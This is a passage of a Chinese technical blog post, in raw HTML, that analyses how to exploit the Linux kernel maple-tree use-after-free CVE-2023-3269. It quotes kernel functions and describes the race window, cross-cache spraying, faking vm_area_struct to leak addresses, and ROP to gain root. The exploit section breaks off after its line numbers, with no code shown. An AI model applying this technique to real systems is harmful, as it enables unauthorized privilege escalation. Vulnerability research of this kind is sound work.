class="hljs-built_in">seq_pad</span>(m, <span class="hljs-string">&#x27; &#x27;</span>);<br>		<span class="hljs-built_in">seq_file_path</span>(m, file, <span class="hljs-string">&quot;\n&quot;</span>);<br>		<span class="hljs-keyword">goto</span> done;<br>	&#125;<br><br>	<span class="hljs-comment">/* ... */</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>然后以以下调用栈调用到__prepend_path</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">seq_file_path<br>    -&gt; seq_path<br>    -&gt; d_path<br>    -&gt; prepend_path<br>    -&gt; __prepend_path<br></code></pre></td></tr></table></figure>

<p>在这个while循环里，只要路径足够深，就能拖很长的时间:)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __prepend_path(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> dentry *dentry, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> mount *mnt,<br>			  <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> path *root, <span class="hljs-keyword">struct</span> prepend_buffer *p)<br>&#123;<br>	<span class="hljs-keyword">while</span> (dentry != root-&gt;dentry || &amp;mnt-&gt;mnt != root-&gt;mnt) &#123;<br>		<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dentry</span> *<span class="hljs-title">parent</span> =</span> READ_ONCE(dentry-&gt;d_parent);<br><br>		<span class="hljs-comment">/* ... */</span><br><br>		<span class="hljs-keyword">if</span> (unlikely(dentry == parent))<br>			<span class="hljs-comment">/* Escaped? */</span><br>			<span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;<br><br>		prefetch(parent);<br>		<span class="hljs-keyword">if</span> (!prepend_name(p, &amp;dentry-&gt;d_name))<br>			<span class="hljs-keyword">break</span>;<br>		dentry = parent;<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<img src="/2026/02/28/cve-2023-3269/nodes_free_and_use.png" srcset="/img/loading.gif" lazyload class title="nodes_free_and_use">

<h3 id="关于UAF窗口"><a href="#关于UAF窗口" class="headerlink" title="关于UAF窗口"></a>关于UAF窗口</h3><p>&#x2F;proc&#x2F;self&#x2F;maps的seq_operations如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> <span class="hljs-title">proc_pid_maps_op</span> =</span> &#123;<br>	.start	= m_start,<br>	.next	= m_next,<br>	.stop	= m_stop,<br>	.show	= show_map<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>其中m_start和m_next都会调用proc_get_vma迭代取下一个vma，其中priv-&gt;iter就是一个上文提过的ma_state</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> vm_area_struct *<span class="hljs-title function_">proc_get_vma</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> proc_maps_private *priv,</span><br><span class="hljs-params">						<span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> vma_next(&amp;priv-&gt;iter);<br><br>	<span class="hljs-keyword">if</span> (vma) &#123;<br>		*ppos = vma-&gt;vm_start;<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		*ppos = <span class="hljs-number">-2UL</span>;<br>		vma = get_gate_vma(priv-&gt;mm);<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> vma;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>m_next和m_start调用proc_get_vma的不同在于m_start会将priv-&gt;iter的node重置为MAS_START，之后在查找vma时会重新遍历maple tree取第一个node，而m_next不会重置node而是接着之前遍历的结果取下一个node&#x2F;vma</p>
<p>触发UAF需要连续调用m_next，中途不能有m_start，因为如果重新遍历maple tree那么会取到新的node，ma_state里的UAF指针丢失</p>
<p>所以UAF需要的执行路径是：</p>
<ol>
<li><p>m_next记录target node到ma_state</p>
</li>
<li><p>expand_stack调用到mas_replace，替换slot指针为new node，准备rcu释放target node</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">mas_replace</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ma_state *mas, <span class="hljs-type">bool</span> advanced)</span><br>	__<span class="hljs-title function_">must_hold</span><span class="hljs-params">(mas-&gt;tree-&gt;lock)</span><br>&#123;<br><span class="hljs-comment">// ...</span><br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		rcu_assign_pointer(slots[offset], mas-&gt;node);<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (!advanced) &#123;<br>		mte_set_node_dead(old_enode);<br>		mas_free(mas, old_enode);<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p>show_map打印内存段信息，通过超长目录拖时间达到rcu宽限期，target node被free，然后被用户取到，伪造vma</p>
</li>
<li><p>m_next的node依然是已经free的target node，从中取下一个vma，取到了用户伪造的指针</p>
</li>
</ol>
<p>想要达成这个执行顺序最重要的就是避免调用m_start，需要避免两个问题：</p>
<ol>
<li><p>seq_file有一个buffer存储输出内容，如果buffer overflow会中止这轮读取，下轮读取重新申请buffer，再把数据复制过去，这样会导致调用m_start</p>
<p>由于需要拖时间我们需要超长的目录一定会导致overflow，可以在低地址mmap一个更长的目录先扩大buffer，这样之后打UAF的时候就不会触发overflow</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">seq_read_iter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *iter)</span><br>&#123;<br>    <span class="hljs-comment">// ...</span><br><br>	m-&gt;from = <span class="hljs-number">0</span>;<br>	p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br>	<br>    <span class="hljs-comment">// ...</span><br>	<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>		<span class="hljs-type">size_t</span> offs = m-&gt;count;<br>		<span class="hljs-type">loff_t</span> pos = m-&gt;index;<br><br>		p = m-&gt;op-&gt;next(m, p, &amp;m-&gt;index);<br>		<span class="hljs-keyword">if</span> (pos == m-&gt;index) &#123;<br>			pr_info_ratelimited(<span class="hljs-string">&quot;buggy .next function %ps did not update position index\n&quot;</span>,<br>					    m-&gt;op-&gt;next);<br>			m-&gt;index++;<br>		&#125;<br>		<span class="hljs-keyword">if</span> (!p || IS_ERR(p))	<span class="hljs-comment">// no next record for us</span><br>			<span class="hljs-keyword">break</span>;<br>		<span class="hljs-keyword">if</span> (m-&gt;count &gt;= iov_iter_count(iter))<br>			<span class="hljs-keyword">break</span>;<br>		err = m-&gt;op-&gt;show(m, p);<br>		<span class="hljs-keyword">if</span> (err &gt; <span class="hljs-number">0</span>) &#123;		<span class="hljs-comment">// -&gt;show() says &quot;skip it&quot;</span><br>			m-&gt;count = offs;<br>		&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (err || seq_has_overflowed(m)) &#123; <span class="hljs-comment">// overflow!!!</span><br>			m-&gt;count = offs;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>	&#125;<br>	m-&gt;op-&gt;stop(m, p);<br>	n = copy_to_iter(m-&gt;buf, m-&gt;count, iter);<br>    <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p>每次read系统调用都会调用m_start，所以UAF的过程需要在一次read里完成</p>
</li>
</ol>
<h3 id="关于长目录拖时间"><a href="#关于长目录拖时间" class="headerlink" title="关于长目录拖时间"></a>关于长目录拖时间</h3><p>实际测试的时候发现一个现象，似乎真正能拖长时间的实际上是内存写，在这个利用场景下是往seq buffer里写目录，所以增加目录深度实际上是变相增长目录长度，由于过深的目录会严重消耗系统资源，所以可以增加单个文件的长度，比如&#x2F;a&#x2F;a&#x2F;a-&gt;&#x2F;aaa&#x2F;aaa&#x2F;aaa来增加目录长度</p>
<p>这个现象在seq buffer overflow的时候尤其明显，因为overflow需要把旧buffer的数据移到新buffer，进行大量的内存写</p>
<h2 id="From-slab-UAF-to-page-UAF"><a href="#From-slab-UAF-to-page-UAF" class="headerlink" title="From slab UAF to page UAF"></a>From slab UAF to page UAF</h2><p>maple node使用专用slab，需要cross cache，可以fork大量子进程喷maple node，没什么好说的</p>
<h2 id="From-UAF-to-address-leaking"><a href="#From-UAF-to-address-leaking" class="headerlink" title="From UAF to address leaking"></a>From UAF to address leaking</h2><p>通过伪造maple node的slot指针指向已知地址可以读取地址内容，此时该地址会被视为一个vm_area_struct结构体，show_map_vma会读取vm_area_struct-&gt;vm_start和vm_area_struct-&gt;vm_end返回用户态</p>
<img src="/2026/02/28/cve-2023-3269/node_master_code_leak.png" srcset="/img/loading.gif" lazyload class title="node_master_code_leak">

<p>地址内容需要满足某些要求才能被视为一个合法的vm_area_struct，不会再show_map_vma的时候panic：</p>
<ul>
<li>vma-&gt;vm_mm为空或合法地址</li>
<li>vma-&gt;vm_file为空</li>
<li>在泄漏阶段，vma-&gt;vm_ops要为空，或者vma-&gt;vm_ops-&gt;name为空</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">show_map_vma</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span> =</span> vma-&gt;vm_file;<br>	<span class="hljs-type">vm_flags_t</span> flags = vma-&gt;vm_flags;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ino = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> pgoff = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, end;<br>	<span class="hljs-type">dev_t</span> dev = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name = <span class="hljs-literal">NULL</span>;<br><br>	<span class="hljs-keyword">if</span> (file) &#123; <span class="hljs-comment">// vma-&gt;vm_file == NULL</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> file_inode(vma-&gt;vm_file);<br>		dev = inode-&gt;i_sb-&gt;s_dev;<br>		ino = inode-&gt;i_ino;<br>		pgoff = ((<span class="hljs-type">loff_t</span>)vma-&gt;vm_pgoff) &lt;&lt; PAGE_SHIFT;<br>	&#125;<br><br>	start = vma-&gt;vm_start;<br>	end = vma-&gt;vm_end;<br>	show_vma_header_prefix(m, start, end, flags, pgoff, dev, ino);<br><br>	<span class="hljs-comment">// ...</span><br><br>    <span class="hljs-comment">// vma-&gt;vm_ops == NULL</span><br>	<span class="hljs-keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;name) &#123;<br>		name = vma-&gt;vm_ops-&gt;name(vma);<br>		<span class="hljs-keyword">if</span> (name)<br>			<span class="hljs-keyword">goto</span> done;<br>	&#125;<br><br>	name = arch_vma_name(vma);<br>	<span class="hljs-keyword">if</span> (!name) &#123;<br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anon_vma_name</span> *<span class="hljs-title">anon_name</span>;</span><br><br>        <span class="hljs-comment">// vma-&gt;vm_mm == NULL or an address</span><br>		<span class="hljs-keyword">if</span> (!mm) &#123;<br>			name = <span class="hljs-string">&quot;[vdso]&quot;</span>;<br>			<span class="hljs-keyword">goto</span> done;<br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (vma-&gt;vm_start &lt;= mm-&gt;brk &amp;&amp;<br>		    vma-&gt;vm_end &gt;= mm-&gt;start_brk) &#123;<br>			name = <span class="hljs-string">&quot;[heap]&quot;</span>;<br>			<span class="hljs-keyword">goto</span> done;<br>		&#125;<br>	<span class="hljs-comment">// ... </span><br>	&#125;<br><br>done:<br>	<span class="hljs-keyword">if</span> (name) &#123;<br>		seq_pad(m, <span class="hljs-string">&#x27; &#x27;</span>);<br>		seq_puts(m, name);<br>	&#125;<br>	seq_putc(m, <span class="hljs-string">&#x27;\n&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>伪造slot需要已知地址，原作者用CVE-2023-0597泄漏内核基址，在泄漏堆地址的时候则使用init_task的tasks双链表泄漏堆地址，这样可以通过喷task_struct再free来保证获得一个地址已知的页来伪造vm_area_struct以及写rop链</p>
<p>但可能是因为我用的自己编的内核，环境可能不太一样，实测的时候如果使用tasks链表泄漏地址，vm_ops和active_mm重合且不为空，active_mm的name的偏移处也不为空，无法满足泄漏要求，所以我用了一种非常不优雅的方式来泄漏堆地址~~~&#x2F;&#x2F;&#x2F;(^v^)\~~~</p>
<p>ret2dir，mmap大量页喷内存，喷的足够多就能一定程度上保证目标地址可控，且这种leak方法有一定程度上的内存搜索能力，运气好成功率还是可以保证的（但换个环境就不一定了😓）</p>
<p><em>有空可以研究一下为什么active_mm不空了，画一个饼（</em></p>
<p>想要更优雅地泄漏需要找到满足以下要求的资源：</p>
<ul>
<li>可喷</li>
<li>内核数据段存有指针，或者通过递归读取能获得指针</li>
<li>每个读取过程都满足leak条件</li>
</ul>
<p>我没找到有什么资源满足以上要求，放弃(lll￢ω￢)</p>
<h2 id="From-UAF-to-root-privileges"><a href="#From-UAF-to-root-privileges" class="headerlink" title="From UAF to root privileges"></a>From UAF to root privileges</h2><p>伪造跳转表来ROP，也没什么好说的</p>
<h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><p>一个写的很丑的exp:(</p>
<p><em>by一个懒得研究原作者exp选择自己手搓的屑</em></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span 